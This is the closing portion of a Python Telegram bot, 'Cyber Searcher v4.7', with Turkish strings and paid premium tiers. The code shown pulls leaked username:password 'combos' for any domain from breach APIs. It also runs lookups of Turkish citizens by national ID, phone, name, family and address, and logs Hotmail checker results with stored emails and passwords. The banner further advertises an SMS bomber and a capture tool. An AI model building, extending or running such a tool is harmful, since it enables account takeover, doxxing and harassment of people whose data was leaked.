    uid = msg.from_user.id
    txt = msg.text.strip().split()
    if not txt: return
    domain = txt[0].replace("http://", "").replace("https://", "").split("/")[0]
    limit = int(txt[1]) if len(txt) > 1 and txt[1].isdigit() else None
    sm = bot_instance.reply_to(msg, s(uid, "searching", domain=esc(domain)), parse_mode="HTML")
    combos, err, apis = _combo_engine(domain, limit)
    if err or not combos:
        bot_instance.edit_message_text(s(uid, "no_result", domain=esc(domain)), msg.chat.id, sm.message_id, parse_mode="HTML")
        return
    update_stats(uid, len(combos))
    now = datetime.now()
    fname = f"{domain}_{now.strftime('%Y%m%d_%H%M%S')}.txt"
    with open(fname, "w", encoding="utf-8") as f:
        f.write(f"{'=' * 60}\nCYBER SEARCHER — {domain.upper()}\n{'=' * 60}\n")
        f.write(f" Toplam: {len(combos)}\nTarih: {now.strftime('%d.%m.%Y %H:%M')}\n{'=' * 60}\n")
        f.write("\n".join(combos))
        f.write(f"\n{'=' * 60}\n@hackledin\n")
    with open(fname, "rb") as f:
        bot_instance.send_document(msg.chat.id, f,
            caption=s(uid, "combo_caption", domain=esc(domain), count=len(combos), apis=esc(apis)), parse_mode="HTML")
    os.remove(fname)
    try: bot_instance.delete_message(msg.chat.id, sm.message_id)
    except: pass

def _combo_engine(domain, limit=None):
    for bad in YASAKLI:
        if bad in domain.lower(): return None, f"Yasaklı: {bad}", None
    combos = []; apis = []
    def _extract(line):
        line = str(line)
        m = re.search(r"://[^/]+/[^:]*:(.+?):(.+)$", line)
        if m: return m.group(1).strip(), m.group(2).strip()
        parts = line.split(":")
        if len(parts) >= 2: return parts[-2].strip(), parts[-1].strip()
        return None, None
    for api in API_LIST:
        try:
            r = requests.get(api["url"] + domain, headers={"User-Agent":"Mozilla/5.0"}, timeout=10, verify=False)
            if r.status_code != 200: continue
            data = r.json(); lines = []
            if api["type"] == "wazely": lines = data.get("foundLines", [])
            elif api["type"] == "solidar": lines = data.get("sonuclar", [])
            elif api["type"] == "rootturkey":
                raw = data.get("data","") if isinstance(data, dict) else r.text
                lines = raw.split("\n")
            for l in lines:
                u, p = _extract(l)
                if u and p: combos.append(f"{u}:{p}")
            apis.append(api["name"])
        except: pass
    uniq = list(set(combos))
    if limit: uniq = uniq[:limit]
    return uniq, None, " + ".join(apis)

def _process_turkey(msg, tool, bot_instance):
    uid = msg.from_user.id
    param = msg.text.strip()
    l = lang(uid)
    if tool in ("tc","tcpro","aile","ailepro","sulale","tcgsm","eokul","tapu","adres"):
        if not (param.isdigit() and len(param) == 11):
            bot_instance.reply_to(msg, s(uid, "invalid_tc"), parse_mode="HTML"); return
    elif tool == "gsmtc":
        clean = re.sub(r"\D", "", param).lstrip("0")
        if not (clean.isdigit() and len(clean) == 10):
            bot_instance.reply_to(msg, s(uid, "invalid_gsm"), parse_mode="HTML"); return
        param = clean
    elif tool == "adsoyad":
        if len(param.split()) < 2:
            bot_instance.reply_to(msg, s(uid, "invalid_adsoyad"), parse_mode="HTML"); return
    elif tool == "adaparsel":
        if "," not in param:
            bot_instance.reply_to(msg, s(uid, "invalid_adaparsel"), parse_mode="HTML"); return
    sm = bot_instance.reply_to(msg, s(uid, "processing"), parse_mode="HTML")
    api_cfg = TURKIYE_API[tool]; url = api_cfg["url"]
    if tool == "adsoyad":
        pts = param.split()
        url = url.replace("{ad}", pts[0]).replace("{soyad}", " ".join(pts[1:]))
    elif tool == "gsmtc": url = url.replace("{gsm}", param)
    elif tool == "adaparsel":
        pts = param.split(",")
        url = url.replace("{il}", pts[0].strip().upper()).replace("{ilce}", pts[1].strip().upper())
    else: url = url.replace("{tc}", param)
    data, err = _api_get(url)
    if err:
        bot_instance.edit_message_text(err, msg.chat.id, sm.message_id, parse_mode="HTML"); return
    result = _fmt_generic(f"{TURKIYE_API[tool]['icon']} {TURKIYE_API[tool][l]}", data, param, "Türkiye Sorgu")
    _send_txt_result(msg.chat.id, sm.message_id, bot_instance,
                     f"Turkey_{tool}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt", result,
                     s(uid, "tr_caption", tool=esc(tool.upper()), param=esc(param)))

def _process_ls(msg, key, bot_instance):
    uid = msg.from_user.id
    val = msg.text.strip()
    if not val: return
    sm = bot_instance.reply_to(msg, s(uid, "processing"), parse_mode="HTML")
    info = LEAKSIGHTS_API[key]
    url = info["url"].replace("{value}", requests.utils.quote(val))
    data, err = _api_get(url)
    if err:
        bot_instance.edit_message_text(err, msg.chat.id, sm.message_id, parse_mode="HTML"); return
    l = lang(uid)
    title = f"{info['icon']} LeakSights — {info.get(l, info.get('tr', key))}"
    result = _fmt_generic(title, data, val, "LeakSights ⭐")
    _send_txt_result(msg.chat.id, sm.message_id, bot_instance,
                     f"LS_{key}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt", result,
                     s(uid, "ls_caption", val=esc(val)))

def _api_get(url):
    try:
        r = requests.get(url, headers={"User-Agent":"Mozilla/5.0"}, timeout=20, verify=False)
        if r.status_code == 200:
            try: return r.json(), None
            except: return None, f"JSON hatası: {esc(r.text[:300])}"
        return None, f"❌ HTTP {r.status_code}"
    except requests.Timeout: return None, "⏰ Zaman aşımı!"
    except Exception as e: return None, f"❌ {esc(e)}"

def _fmt_generic(title, data, queried, header_extra=""):
    now = datetime.now().strftime("%d.%m.%Y %H:%M:%S")
    lines = ["=" * 60, f" {title}", "=" * 60, f" Aranan  : {queried}", f" Tarih   : {now}", "=" * 60, ""]
    def _dump(obj, indent=0):
        prefix = "  " * indent
        if isinstance(obj, dict):
            for k, v in obj.items():
                if v is None or str(v).strip() == "": continue
                if isinstance(v, (dict, list)):
                    lines.append(f"{prefix}• {k}:"); _dump(v, indent + 1)
                else: lines.append(f"{prefix}• {k}: {v}")
        elif isinstance(obj, list):
            for i, item in enumerate(obj, 1):
                lines.append(f"{prefix}[{i}]"); _dump(item, indent + 1); lines.append("")
        else:
            if str(obj).strip(): lines.append(f"{prefix}{obj}")
    _dump(data)
    lines += ["", "=" * 60, f" {header_extra} — Cyber Searcher", " Developer: @hackledin", "=" * 60]
    return "\n".join(lines)

def _send_txt_result(chat_id, status_mid, bot_instance, fname, content, caption):
    try:
        with open(fname, "w", encoding="utf-8") as f: f.write(content)
        with open(fname, "rb") as f: bot_instance.send_document(chat_id, f, caption=caption, parse_mode="HTML")
        os.remove(fname)
        try: bot_instance.delete_message(chat_id, status_mid)
        except: pass
    except Exception as e:
        try: bot_instance.edit_message_text(f"❌ {esc(e)}", chat_id, status_mid, parse_mode="HTML")
        except: pass

def _process_addbot(msg, bot_instance):
    uid = msg.from_user.id
    token = msg.text.strip()
    if len(token) < 30:
        bot_instance.reply_to(msg, "❌ Geçersiz token!", parse_mode="HTML"); return
    if token == BOT_TOKEN:
        bot_instance.reply_to(msg, "❌ Ana bot token'ı eklenemez!", parse_mode="HTML"); return
    with _PROC_LOCK:
        if token in _CHILD_PROCS and _CHILD_PROCS[token].poll() is None:
            bot_instance.reply_to(msg, s(uid, "multi_bot_exists"), parse_mode="HTML"); return
        try:
            success = _spawn_bot(token, uid)
            if success:
                bot_instance.reply_to(msg, s(uid, "multi_bot_added", token=esc(token[:20] + "..."), owner=esc(msg.from_user.first_name or str(uid))), parse_mode="HTML")
            else:
                bot_instance.reply_to(msg, "❌ Bot başlatılamadı!", parse_mode="HTML")
        except Exception as e:
            bot_instance.reply_to(msg, f"❌ Hata: {esc(e)}", parse_mode="HTML")

def _process_special_tool(msg, tool, bot_instance):
    uid = msg.from_user.id
    val = msg.text.strip()
    sm = bot_instance.reply_to(msg, s(uid, "processing"), parse_mode="HTML")
    if tool == "proxycheck": result = _proxycheck(val)
    else:
        domain = val.replace("http://", "").replace("https://", "").split("/")[0]
        result = _urlscan(domain)
    if len(result) > 4000:
        for i in range(0, len(result), 4000):
            try:
                bot_instance.send_message(msg.chat.id, f"<pre>{esc(result[i:i + 4000])}</pre>", parse_mode="HTML")
            except:
                bot_instance.send_message(msg.chat.id, result[i:i + 4000])
        try: bot_instance.delete_message(msg.chat.id, sm.message_id)
        except: pass
    else:
        try:
            bot_instance.edit_message_text(f"<pre>{esc(result)}</pre>", msg.chat.id, sm.message_id, parse_mode="HTML")
        except:
            bot_instance.edit_message_text(result, msg.chat.id, sm.message_id)

def _process_generic_tool(msg, tool, bot_instance):
    uid = msg.from_user.id; val = msg.text.strip()
    sm = bot_instance.reply_to(msg, s(uid, "processing"), parse_mode="HTML")
    try:
        resp = requests.get(TOOLS_API[tool] + val, timeout=15, verify=False)
        try: out = json.dumps(resp.json(), indent=2, ensure_ascii=False)
        except: out = resp.text
        try:
            bot_instance.edit_message_text(f"✅ <b>{esc(tool.upper())}</b>\n<pre>{esc(out[:3800])}</pre>",
                                           msg.chat.id, sm.message_id, parse_mode="HTML")
        except:
            bot_instance.edit_message_text(f"{tool.upper()}\n{out[:3800]}", msg.chat.id, sm.message_id)
    except Exception as e:
        bot_instance.edit_message_text(f"❌ {esc(e)}", msg.chat.id, sm.message_id, parse_mode="HTML")

def _proxycheck(ip):
    try:
        r = requests.get(f"https://proxycheck.io/v3/{ip}?vpn=1&asn=1&risk=1&port=1", timeout=15, verify=False)
        if r.status_code != 200: return f"❌ HTTP {r.status_code}"
        d = r.json()
        if ip not in d: return "❌ IP bulunamadı."
        info = d[ip]; loc = info.get("location", {}); det = info.get("detections", {}); net = info.get("network", {})
        lines = ["=" * 60, " 🛡️ PROXYCHECK.IO", "=" * 60, f" IP: {ip}", "",
                 " 📡 AĞ", f"  ASN        : {net.get('asn', '—')}",
                 f"  Sağlayıcı  : {net.get('provider', '—')}", "",
                 " 📍 KONUM", f"  Ülke  : {loc.get('country_name', '—')}",
                 f"  Şehir : {loc.get('city_name', '—')}", "",
                 " 🔍 TESPİT",
                 f"  Proxy    : {'⚠️ Evet' if det.get('proxy') else '✅ Hayır'}",
                 f"  VPN      : {'⚠️ Evet' if det.get('vpn') else '✅ Hayır'}",
                 f"  Risk     : {det.get('risk', 0)}%", "",
                 "=" * 60, " @hackledin", "=" * 60]
        return "\n".join(lines)
    except Exception as e: return f"❌ {e}"

def _urlscan(domain):
    try:
        r = requests.get(f"https://urlscan.io/api/v1/search/?q={domain}",
                         headers={"User-Agent":"Mozilla/5.0"}, timeout=15, verify=False)
        if r.status_code != 200: return f"❌ HTTP {r.status_code}"
        results = r.json().get("results", [])
        if not results: return f"🔍 {domain} için sonuç yok."
        lines = ["=" * 60, f" 🔍 URLSCAN.IO — {domain}", "=" * 60, ""]
        for i, res in enumerate(results[:5], 1):
            task = res.get("task", {}); page = res.get("page", {})
            lines += [f" SONUÇ #{i}", f"  URL    : {task.get('url', '—')}",
                      f"  IP     : {page.get('ip', '—')}", f"  Ülke   : {page.get('country', '—')}", ""]
        lines += ["=" * 60, " @hackledin", "=" * 60]
        return "\n".join(lines)
    except Exception as e: return f"❌ {e}"

def _run_predunyam(chat_id, uid, bot_instance):
    try:
        r = requests.get(TOOLS_API["predunyam"], timeout=10, verify=False)
        bot_instance.send_message(chat_id, f"💎 <b>PreDunyam</b>\n<pre>{esc(r.text[:3500])}</pre>", parse_mode="HTML")
    except Exception as e:
        bot_instance.send_message(chat_id, f"❌ {esc(e)}", parse_mode="HTML")

def _handle_admin_cb(call, action, bot_instance):
    uid = call.from_user.id; cid = call.message.chat.id; mid = call.message.message_id
    try:
        if action == "stats":
            tu, prem_pu, osint_pu, tc, tch = get_bot_stats()
            txt = (f"📊 <b>BOT İSTATİSTİK</b>\n{'─' * 30}\n"
                   f"👥 Toplam: <b>{tu}</b>\n📧 Hotmail Premium: <b>{prem_pu or 0}</b>\n"
                   f"🌍 OSINT Premium: <b>{osint_pu or 0}</b>\n📦 Toplam Combo: <b>{tc or 0}</b>\n"
                   f"🔍 Toplam Sorgu: <b>{tch or 0}</b>")
            try: bot_instance.edit_message_text(txt, cid, mid, parse_mode="HTML")
            except: bot_instance.send_message(cid, txt, parse_mode="HTML")
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "prem_users":
            conn = sqlite3.connect(DB_PATH); c = conn.cursor()
            c.execute("SELECT user_id,username,first_name,premium_date,premium_osint_date FROM users WHERE is_premium=1 OR is_premium_osint=1")
            users = c.fetchall(); conn.close()
            if not users:
                try: bot_instance.answer_callback_query(call.id, "Premium kullanıcı yok.")
                except: pass
                return
            txt = "⭐ <b>PREMIUM KULLANICILARI</b>\n"
            for u_id, uname, fname, prem_date, osint_date in users:
                txt += f"👤 @{esc(uname or fname or u_id)}\n"
                if prem_date: txt += f"   📧 {esc(prem_date)}\n"
                if osint_date: txt += f"   🌍 {esc(osint_date)}\n"
            try: bot_instance.edit_message_text(txt[:4000], cid, mid, parse_mode="HTML")
            except: bot_instance.send_message(cid, txt[:4000], parse_mode="HTML")
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "prem_log":
            logs = get_premium_logs(20)
            if not logs:
                try: bot_instance.answer_callback_query(call.id, "Log yok.")
                except: pass
                return
            txt = "📋 <b>PREMIUM LOG</b>\n"
            for u_id, uname, package, amount, date in logs:
                txt += f"👤 @{esc(uname or u_id)}  📦 {package}  💰 {amount}⭐\n"
            try: bot_instance.edit_message_text(txt[:4000], cid, mid, parse_mode="HTML")
            except: bot_instance.send_message(cid, txt[:4000], parse_mode="HTML")
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "give_premium":
            m = bot_instance.send_message(cid, "⭐ <b>Premium Ver</b>\nKullanıcı ID veya @kullanıcıadı gir:", parse_mode="HTML")
            bot_instance.register_next_step_handler(m, lambda m: _admin_premium_select_user(m, bot_instance))
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action.startswith("give_hotmail_"):
            parts = action.split("_"); tid = int(parts[2]); tuname = parts[3] if len(parts) > 3 else str(tid)
            _admin_give_premium_hotmail(call, tid, tuname, bot_instance); return
        elif action.startswith("give_osint_"):
            parts = action.split("_"); tid = int(parts[2]); tuname = parts[3] if len(parts) > 3 else str(tid)
            _admin_give_premium_osint(call, tid, tuname, bot_instance); return
        elif action.startswith("give_capture_"):
            parts = action.split("_"); tid = int(parts[2]); tuname = parts[3] if len(parts) > 3 else str(tid)
            _admin_give_premium_capture(call, tid, tuname, bot_instance); return
        elif action == "remove":
            m = bot_instance.send_message(cid, "👤 <b>Premium Kaldır</b>\nID veya @kullanıcıadı gir:", parse_mode="HTML")
            bot_instance.register_next_step_handler(m, lambda m: _admin_remove(m, bot_instance))
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "ban":
            m = bot_instance.send_message(cid, "🚫 Banlanacak kullanıcıyı gir:", parse_mode="HTML")
            bot_instance.register_next_step_handler(m, lambda m: _admin_ban(m, bot_instance))
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "unban":
            m = bot_instance.send_message(cid, "✅ Banı kaldırılacak kullanıcıyı gir:", parse_mode="HTML")
            bot_instance.register_next_step_handler(m, lambda m: _admin_unban(m, bot_instance))
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "banned":
            banned = get_banned_users()
            if not banned:
                bot_instance.send_message(cid, "📭 Yasaklı yok.", parse_mode="HTML")
            else:
                txt = "🚫 <b>YASAKLI KULLANICILAR</b>\n"
                for u_id, uname, fname, reason in banned:
                    txt += f"👤 @{esc(uname or fname or u_id)}\n📌 {esc(reason)}\n"
                bot_instance.send_message(cid, txt[:4000], parse_mode="HTML")
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "announce":
            m = bot_instance.send_message(cid, "📢 Duyuru mesajını gir:", parse_mode="HTML")
            bot_instance.register_next_step_handler(m, lambda m: _admin_announce(m, bot_instance))
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "listbots":
            registry = _load_registry()
            if not registry:
                bot_instance.send_message(cid, s(uid, "multi_bot_no_bots"), parse_mode="HTML")
            else:
                lines = [s(uid, "multi_bot_list"), "─" * 30, ""]
                for token, info in registry.items():
                    with _PROC_LOCK:
                        proc = _CHILD_PROCS.get(token)
                        status = s(uid, "multi_bot_running") if proc and proc.poll() is None else s(uid, "multi_bot_stopped")
                    lines.append(f"🔑 <code>{esc(token)}</code>")
                    lines.append(f"   📌 {status}  📋 PID: {info.get('pid', '—')}")
                    lines.append("")
                bot_instance.send_message(cid, "\n".join(lines)[:4000], parse_mode="HTML")
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "hotmail_log":
            logs = get_hotmail_logs(30)
            if not logs:
                bot_instance.send_message(cid, "📭 Hotmail log yok.", parse_mode="HTML")
            else:
                txt = "📋 <b>HOTMAIL LOG</b>\n"
                for u_id, uname, email, password, status, detail, date in logs:
                    em = "✅" if status == "HIT" else "🔐" if status == "2FA" else "❌"
                    txt += f"{em} @{esc(uname or u_id)} | {esc(email)} | {status}\n"
                bot_instance.send_message(cid, txt[:4000], parse_mode="HTML")
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "tgid_give":
            m = bot_instance.send_message(cid, "🆔 <b>TG-ID Bakiye Ver</b>\nFormat: <code>USER_ID MIKTAR</code>", parse_mode="HTML")
            bot_instance.register_next_step_handler(m, lambda m: _admin_tgid_give(m, bot_instance))
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "tgid_take":
            m = bot_instance.send_message(cid, "➖ <b>TG-ID Bakiye Al</b>\nFormat: <code>USER_ID MIKTAR</code>", parse_mode="HTML")
            bot_instance.register_next_step_handler(m, lambda m: _admin_tgid_take(m, bot_instance))
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "tgid_logs":
            conn = sqlite3.connect(DB_PATH); c = conn.cursor()
            c.execute("SELECT user_id, username, target, status, date FROM tgid_logs ORDER BY id DESC LIMIT 20")
            logs = c.fetchall(); conn.close()
            if not logs:
                bot_instance.send_message(cid, "📭 TG-ID log yok.", parse_mode="HTML")
            else:
                txt = "📋 <b>SON 20 TG-ID</b>\n"
                for u_id, uname, target, status, date in logs:
                    ico = "✅" if status == "OK" else "❌"
                    txt += f"{ico} @{esc(target)} — @{esc(uname or u_id)} | {date[5:16]}\n"
                bot_instance.send_message(cid, txt[:4000], parse_mode="HTML")
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "tgid_purchases":
            conn = sqlite3.connect(DB_PATH); c = conn.cursor()
            c.execute("SELECT user_id, username, package, queries, stars, date FROM tgid_purchases ORDER BY id DESC LIMIT 20")
            logs = c.fetchall(); conn.close()
            if not logs:
                bot_instance.send_message(cid, "📭 TG-ID satın alma yok.", parse_mode="HTML")
            else:
                txt = "💰 <b>SON 20 TG-ID SATIN ALMA</b>\n"
                for u_id, uname, package, q, stars, date in logs:
                    txt += f"👤 @{esc(uname or u_id)} | {package} | +{q} | {stars}⭐\n"
                bot_instance.send_message(cid, txt[:4000], parse_mode="HTML")
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "aiimg_give":
            m = bot_instance.send_message(cid, "🎨 <b>AI Resim Hak Ver</b>\nFormat: <code>USER_ID MIKTAR</code>", parse_mode="HTML")
            bot_instance.register_next_step_handler(m, lambda m: _admin_aiimg_give(m, bot_instance))
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "aiimg_take":
            m = bot_instance.send_message(cid, "➖ <b>AI Resim Hak Al</b>\nFormat: <code>USER_ID MIKTAR</code>", parse_mode="HTML")
            bot_instance.register_next_step_handler(m, lambda m: _admin_aiimg_take(m, bot_instance))
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "aiimg_logs":
            conn = sqlite3.connect(DB_PATH); c = conn.cursor()
            c.execute("SELECT user_id, username, prompt, status, date FROM aiimg_logs ORDER BY id DESC LIMIT 20")
            logs = c.fetchall(); conn.close()
            if not logs:
                bot_instance.send_message(cid, "📭 AI log yok.", parse_mode="HTML")
            else:
                txt = "📋 <b>SON 20 AI LOG</b>\n"
                for u_id, uname, prompt, status, date in logs:
                    ico = "✅" if status == "OK" else "❌"
                    txt += f"{ico} @{esc(uname or u_id)} | {esc((prompt or '')[:40])}\n"
                bot_instance.send_message(cid, txt[:4000], parse_mode="HTML")
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "aiimg_purchases":
            conn = sqlite3.connect(DB_PATH); c = conn.cursor()
            c.execute("SELECT user_id, username, package, credits, stars, date FROM aiimg_purchases ORDER BY id DESC LIMIT 20")
            logs = c.fetchall(); conn.close()
            if not logs:
                bot_instance.send_message(cid, "📭 AI satın alma yok.", parse_mode="HTML")
            else:
                txt = "💰 <b>SON 20 AI SATIN ALMA</b>\n"
                for u_id, uname, package, qty, stars, date in logs:
                    txt += f"👤 @{esc(uname or u_id)} | {package} | +{qty} | {stars}⭐\n"
                bot_instance.send_message(cid, txt[:4000], parse_mode="HTML")
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
    except Exception as e:
        print(f"[ADMIN CALLBACK ERROR] {e}")
        try: bot_instance.answer_callback_query(call.id, "⚠️ Hata!", show_alert=True)
        except: pass

def _admin_remove(msg, bot_instance):
    tid, tuname = _resolve_target(msg.text.strip())
    if not tid:
        bot_instance.reply_to(msg, "❌ Kullanıcı bulunamadı!", parse_mode="HTML"); return
    removed = []
    if is_premium(tid): remove_premium(tid); removed.append("Hotmail")
    if is_premium_osint(tid): remove_premium_osint(tid); removed.append("OSINT")
    if removed: bot_instance.reply_to(msg, f"✅ @{esc(tuname or tid)} {', '.join(removed)} Premium kaldırıldı!", parse_mode="HTML")
    else: bot_instance.reply_to(msg, f"ℹ️ Zaten Premium değil!", parse_mode="HTML")

def _admin_ban(msg, bot_instance):
    tid, tuname = _resolve_target(msg.text.strip())
    if not tid:
        bot_instance.reply_to(msg, "❌ Bulunamadı!", parse_mode="HTML"); return
    m = bot_instance.reply_to(msg, f"🚫 @{esc(tuname or tid)} banlanıyor... Sebep gir:", parse_mode="HTML")
    bot_instance.register_next_step_handler(m, lambda m: _admin_ban_reason(m, bot_instance, tid, tuname))

def _admin_ban_reason(msg, bot_instance, tid, tuname):
    reason = msg.text.strip() or "Kural ihlali"
    ban_user(tid, reason)
    bot_instance.reply_to(msg, f"🚫 @{esc(tuname or tid)} yasaklandı!\nSebep: {esc(reason)}", parse_mode="HTML")
    try: bot_instance.send_message(tid, f"🚫 <b>YASAKLANDINIZ!</b>\nSebep: {esc(reason)}", parse_mode="HTML")
    except: pass

def _admin_unban(msg, bot_instance):
    tid, tuname = _resolve_target(msg.text.strip())
    if not tid:
        bot_instance.reply_to(msg, "❌ Bulunamadı!", parse_mode="HTML"); return
    unban_user(tid)
    bot_instance.reply_to(msg, f"✅ @{esc(tuname or tid)} banı kaldırıldı!", parse_mode="HTML")

def _admin_announce(msg, bot_instance):
    announcement = msg.text.strip()
    if not announcement:
        bot_instance.reply_to(msg, "❌ Kullanım: /duyuru MESAJ", parse_mode="HTML"); return
    users = get_all_users()
    if not users:
        bot_instance.reply_to(msg, "❌ Kullanıcı yok.", parse_mode="HTML"); return
    sent = 0; failed = 0
    for user_id, username, first_name, banned in users:
        if banned: continue
        try:
            txt = f"📢 <b>DUYURU</b>\n{esc(announcement)}\n📅 {datetime.now().strftime('%d.%m.%Y %H:%M')}"
            bot_instance.send_message(user_id, txt, parse_mode="HTML")
            sent += 1
            time.sleep(0.1)
        except: failed += 1
    bot_instance.reply_to(msg, f"✅ Gönderildi!\n✅ {sent}\n❌ {failed}", parse_mode="HTML")

def _admin_tgid_give(msg, bot_instance):
    if msg.from_user.id != ADMIN_ID: return
    try:
        parts = msg.text.strip().split(); target = int(parts[0]); amount = int(parts[1])
        if amount <= 0: raise ValueError
    except:
        bot_instance.reply_to(msg, "❌ Geçersiz! Örnek: <code>123456789 50</code>", parse_mode="HTML"); return
    add_user(target, "", ""); tgid_init_user(target); tgid_add_balance(target, amount)
    bot_instance.reply_to(msg,
        f"✅ <b>Verildi!</b>\n🆔 <code>{target}</code>\n➕ +{amount}\n💰 <b>{tgid_get_balance(target)}</b>",
        parse_mode="HTML")
    try: bot_instance.send_message(target, f"🎁 <b>Admin TG-ID bakiyesi verdi!</b>\n➕ +{amount}\n💰 {tgid_get_balance(target)}", parse_mode="HTML")
    except: pass

def _admin_tgid_take(msg, bot_instance):
    if msg.from_user.id != ADMIN_ID: return
    try:
        parts = msg.text.strip().split(); target = int(parts[0]); amount = int(parts[1])
        if amount <= 0: raise ValueError
    except:
        bot_instance.reply_to(msg, "❌ Geçersiz!", parse_mode="HTML"); return
    new_bal = max(0, tgid_get_balance(target) - amount)
    tgid_set(target, "query_balance", new_bal)
    bot_instance.reply_to(msg, f"✅ <b>Alındı!</b>\n🆔 <code>{target}</code>\n➖ -{amount}\n💰 <b>{new_bal}</b>", parse_mode="HTML")

def _admin_aiimg_give(msg, bot_instance):
    if msg.from_user.id != ADMIN_ID: return
    try:
        parts = msg.text.strip().split(); target = int(parts[0]); amount = int(parts[1])
        if amount <= 0: raise ValueError
    except:
        bot_instance.reply_to(msg, "❌ Geçersiz!", parse_mode="HTML"); return
    add_user(target, "", ""); aiimg_init_user(target); aiimg_add_credits(target, amount)
    bot_instance.reply_to(msg,
        f"✅ <b>AI Hakkı Verildi!</b>\n🆔 <code>{target}</code>\n➕ +{amount}\n💎 <b>{aiimg_get_credits(target)}</b>",
        parse_mode="HTML")
    try: bot_instance.send_message(target, f"🎁 <b>Admin AI hakkı verdi!</b>\n➕ +{amount}\n💎 {aiimg_get_credits(target)}", parse_mode="HTML")
    except: pass

def _admin_aiimg_take(msg, bot_instance):
    if msg.from_user.id != ADMIN_ID: return
    try:
        parts = msg.text.strip().split(); target = int(parts[0]); amount = int(parts[1])
        if amount <= 0: raise ValueError
    except:
        bot_instance.reply_to(msg, "❌ Geçersiz!", parse_mode="HTML"); return
    new_val = max(0, aiimg_get_credits(target) - amount)
    aiimg_set(target, "credit_balance", new_val)
    bot_instance.reply_to(msg, f"✅ <b>Alındı!</b>\n🆔 <code>{target}</code>\n➖ -{amount}\n💎 <b>{new_val}</b>", parse_mode="HTML")

# ══════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════
if __name__ == "__main__":
    child_mode = False; child_token = None
    argv = sys.argv[1:]
    for i, arg in enumerate(argv):
        if arg == "--bot" and i + 1 < len(argv):
            child_mode = True; child_token = argv[i + 1]

    if child_mode and child_token:
        print(f"[CHILD] Starting: {child_token[:10]}...")
        child_bot = telebot.TeleBot(child_token)  # parse_mode kaldırıldı
        register_handlers(child_bot)
        print(f"[CHILD] Bot {child_token[:10]}... ready!")
        try: child_bot.infinity_polling(timeout=60)
        except Exception as e: print(f"[CHILD] Polling error: {e}")
        sys.exit(0)

    # MAIN - parse_mode KALDIRILDI (fonksiyonlarda manuel kullanılıyor)
    main_bot = telebot.TeleBot(BOT_TOKEN)
    register_handlers(main_bot)
    print("[MAIN] Starting saved bots...")
    start_saved_bots()
    print("""
╔══════════════════════════════════════════════════════╗
║       CYBER SEARCHER v4.7 — PRODUCTION               ║
║         Developer: @hackledin                        ║
╠══════════════════════════════════════════════════════╣
║  ✅ YouTube POT Provider                             ║
║  ✅ Müzik + Video İndirici                           ║
║  ✅ Türkiye Sorguları                                ║
║  ✅ Hotmail Checker                                  ║
║  ✅ Capture Tool                                     ║
║  ✅ SMS Bomber (41+ Servis)                          ║
║  ✅ EXIF Metadata                                    ║
║  ✅ Telegram ID Sorgu                                ║
║  ✅ AI Image Generator (minifreeai) 🎨               ║
║  ✅ Türkçe / English / العربية                       ║
║                                                      ║
║  🔧 Parse Mode Hatası Düzeltildi (v4.7)              ║
╚══════════════════════════════════════════════════════╝
""")
    while True:
        try:
            main_bot.polling(non_stop=True, timeout=60)
        except Exception as e:
            print(f"[HATA] {e}"); time.sleep(5)
